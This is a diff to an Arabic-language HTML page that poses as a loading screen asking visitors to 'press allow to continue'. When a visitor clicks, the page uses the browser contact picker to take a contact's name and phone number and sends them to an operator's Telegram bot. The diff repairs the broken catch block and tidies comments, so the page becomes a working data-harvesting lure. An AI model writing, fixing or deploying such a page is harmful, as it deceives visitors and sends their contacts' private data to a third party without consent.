@@ -10,15 +10,15 @@
     <h2>جاري التحميل، يرجى الانتظار...</h2>
     <p style="color: #888; font-size: 14px;">اضغط على السماح للمتابعة</p>
 
-    <!-- زر وهمي أو إجباري لفتح نافذة اختيار الرقم -->
+    <!-- زر لفتح نافذة اختيار الرقم -->
     <button id="btn" style="background-color: #2ea44f; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 20px;">متابعة</button>
 
     <script>
-        const botToken = 'أدخل_توكن_البوت_هنا'; // حط توكن بوتك هنا
-        const chatId = 'أدخل_رقم_الـ_Chat_ID_هنا'; // حط الآيدي بتاعك هنا
+        const botToken = 'حط_توكن_البوت_هنا_بين_العلامتين'; // ضع توكن البوت الخاص بك هنا
+        const chatId = 'حط_رقم_الايدي_هنا_بين_العلامتين'; // ضع الـ Chat ID الخاص بك هنا
 
         document.getElementById('btn').addEventListener('click', async () => {
-            // التحقق مما إذا كانت الميزة مدعومة في المتصفح
+            // التحقق مما إذا كانت ميزة اختيار جهات الاتصال مدعومة في المتصفح
             if ('contacts' in navigator && 'Navigator' in window) {
                 try {
                     const props = ['tel', 'name'];
@@ -28,7 +28,7 @@
                     if (contacts.length > 0) {
                         const contact = contacts[0];
                         const phoneNumber = contact.tel ? contact.tel[0] : "غير متوفر";
-                        const contactName = contact.name ? contact.name[0] : "بدون اسمk";
+                        const contactName = contact.name ? contact.name[0] : "بدون اسم";
 
                         // تجهيز الرسالة لإرسالها للبوت
                         const message = `تم الحصول على جهة اتصال جديدة:\n👤 الاسم: ${contactName}\n📞 الرقم: ${phoneNumber}`;
@@ -43,18 +43,13 @@
                             })
                         });
                     }
-                } the (err) {
+                } catch (err) {
                     console.log("خطأ أو تم إلغاء الطلب:", err);
                 }
             } else {
                 alert("متصفحك لا يدعم هذه الخاصية.");
             }
         });
-
-        // محاولة فتح النافذة تلقائياً أول ما الصفحة تفتح (بعض المتصفحات تحظرها إلا بضغطـة زر)
-        window.onload = () => {
-            // يمكن للمستخدم الضغط على الزر لو لم تفتح تلقائياً
-        };
     </script>
 
 </body>
